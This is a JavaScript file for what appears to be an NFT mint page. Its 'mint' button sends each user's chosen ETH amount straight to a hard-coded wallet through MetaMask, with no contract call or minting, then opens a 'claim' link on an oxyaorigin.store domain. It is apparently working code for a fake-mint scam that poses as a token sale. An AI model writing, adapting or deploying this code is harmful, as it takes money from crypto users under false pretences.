window.onload = main
function changeQuantity(price) {
  const maxQuantity = 10
  const minQuantity = 1

  const incrementOnId = "plus"
  const decrementOnId = "minus"

  const quantity = document.querySelector("#quantity")
  const total = document.querySelector("#total")
  const mintChange = document.querySelectorAll(".mint-change")
  const mintChangeMap = Array.prototype.slice.call(mintChange)

  const updateTotal = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    total.innerHTML = parseFloat(price * currentQuantity).toFixed(4);
  }

  const incrementQuantity = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    if (currentQuantity === maxQuantity)
      return
    quantity.innerHTML = currentQuantity + 1
  }
  const decrementQuantity = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    if (currentQuantity === minQuantity)
      return
    quantity.innerHTML = currentQuantity - 1
  }

  function onMintChangeClick(event) {
    const type = event.target.id
    if (type === incrementOnId)
      incrementQuantity()
    if (type === decrementOnId)
      decrementQuantity()
    updateTotal()
  }

  updateTotal()
  mintChangeMap.map(el => el.addEventListener("click", onMintChangeClick))

}

function mint(wallet) {
  const totalElement = document.querySelector("#total")
  const mintNow = document.querySelector("#mint-now")
  const connectWallet = document.querySelector("#connect-wallet")


  const isMetaMaskInstalled = () => {
    const { ethereum } = window;
    return Boolean(ethereum && ethereum.isMetaMask) || false
  };
  const isMetaMaskConnected = async () => {
    if (typeof web3 === 'undefined') return false

    let accounts = await ethereum.request({ method: 'eth_accounts' })
    return accounts.length > 0;
  }
  const redirectToClaim = () => {
    window.open('https://oxyaorigin.store/claim');
  }
  async function onConnectClick() {
    await ethereum.request({ method: 'eth_requestAccounts' })
  }
  async function mint() {
    if (!await isMetaMaskConnected())
      onConnectClick()

    try {
      const total = totalElement.innerHTML * 1000000000000000000
      const adress = (await ethereum.request({ method: 'eth_accounts' }))[0]
      await ethereum.request({
        method: 'eth_sendTransaction',
        params: [
          {
            from: adress,
            to: wallet,
            value: total.toString(16)
          },
        ],
      });
      redirectToClaim()
    } catch (error) {
      console.error(error);
    }
  }
  function preventNonInstalledMMask() {
    if (!isMetaMaskInstalled())
      alert("Consider installing metamask to use our services!")
  }

  mintNow.addEventListener("click", mint)
  connectWallet.addEventListener("click", onConnectClick)

  preventNonInstalledMMask()
}

function main() {
  const price = 0.125
  const wallet = "0xcB084aBC69d172bCaAb638e1f82641D9476D84e3"

  changeQuantity(price)
  mint(wallet)
}